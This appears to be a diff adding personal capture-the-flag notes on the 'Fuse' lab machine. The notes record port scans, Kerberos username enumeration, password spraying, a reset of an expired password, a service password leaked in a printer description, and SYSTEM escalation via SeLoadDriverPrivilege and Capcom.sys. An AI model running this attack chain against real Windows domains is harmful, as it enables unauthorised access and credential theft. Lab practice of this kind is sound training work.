@@ -1,0 +1,114 @@
+OS:
+- Windows
+
+Open Ports (TCP):
+- PORT    STATE SERVICE
+- 53/tcp    open  domain
+- 80/tcp    open  http
+- 88/tcp    open  kerberos-sec
+- 135/tcp   open  msrpc
+- 139/tcp   open  netbios-ssn
+- 389/tcp   open  ldap
+- 445/tcp   open  microsoft-ds
+- 464/tcp   open  kpasswd5
+- 593/tcp   open  http-rpc-epmap
+- 636/tcp   open  ldapssl
+- 3268/tcp  open  globalcatLDAP
+- 3269/tcp  open  globalcatLDAPssl
+- 5985/tcp  open  wsman
+- 9389/tcp  open  adws
+- 49666/tcp open  unknown
+- 49667/tcp open  unknown
+- 49675/tcp open  unknown
+- 49676/tcp open  unknown
+- 49680/tcp open  unknown
+- 49694/tcp open  unknown
+- 49700/tcp open  unknown
+
+
+Open Ports (UDP - Top 20):
+- PORT      STATE         SERVICE      REASON
+- 53/udp    open          domain       udp-response ttl 127
+
+
+Enumerating port 53:
+- tried zone transfer, did not work
+- tried with new domain found: fuse.fabricorp.local
+
+Enumerating port 80:
+- accessed using: http://fuse.fabricorp.local/papercut/logs/html/index.htm
+- found usernames:
+pmerton
+tlavel
+sthompson
+bhult
+administrator
+
+Confirming if users exist in AD with kerbrute:
+2021/01/09 22:07:17 >  [+] VALID USERNAME:       pmerton@fabricorp.local
+2021/01/09 22:07:17 >  [+] VALID USERNAME:       tlavel@fabricorp.local
+2021/01/09 22:07:17 >  [+] VALID USERNAME:       sthompson@fabricorp.local
+2021/01/09 22:07:17 >  [+] VALID USERNAME:       administrator@fabricorp.local
+2021/01/09 22:07:17 >  [+] VALID USERNAME:       bhult@fabricorp.local
+
+
+
+Enumerating port 88:
+- └─# nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='fabricorp.local'" 10.10.10.193
+- PORT   STATE SERVICE
+- 88/tcp open  kerberos-sec
+- | krb5-enum-users: 
+- | Discovered Kerberos principals
+- |_    administrator@fabricorp.local
+
+
+- found potentially interesting document:
+New Starter - bnielson - Notepad
+
+Enumerating port 139/445:
+- tried anonymous login, no shares
+
+
+- enumerating users with cewl wordlist:
+
+2021/01/09 22:22:27 >  [+] VALID LOGIN WITH ERROR:       bhult@fabricorp.local:Fabricorp01       (Clock skew is too great)                                                                                                            
+2021/01/09 22:22:27 >  [+] VALID LOGIN WITH ERROR:       tlavel@fabricorp.local:Fabricorp01      (Clock skew is too great)                                                                                         
+
+Running Crackmapexec to enumerate users:passwords:
+
+SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\pmerton:Fabricorp01 STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
+
+
+- looking into STATUS_PASSWORD_MUST_CHANGE for user tlavel
+
+- changed password with smbpasswd
+- log in with tlavel using RPC Client
+- failed, seems that the password is being changed frequently
+- tried to quickly login after changing the password
+- got logged in
+- enumerating users
+- enumerating  printers. got printer info + password:
+        flags:[0x800000]
+        name:[\\10.10.10.193\HP-MFT01]
+        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+        comment:[]
+
+
+- password: $fab@s3Rv1ce$1
+- added to password list
+- adding users found with enumdomusers to users list
+- running cme smb again with new password
+- got matching creds:
+SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1
+
+- log in using winrm
+- running enum commands:
+whoami /all
+- found:
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+
+- using Capcom.sys to exploit and priv esc
+- instructions: https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
+- got shell as system
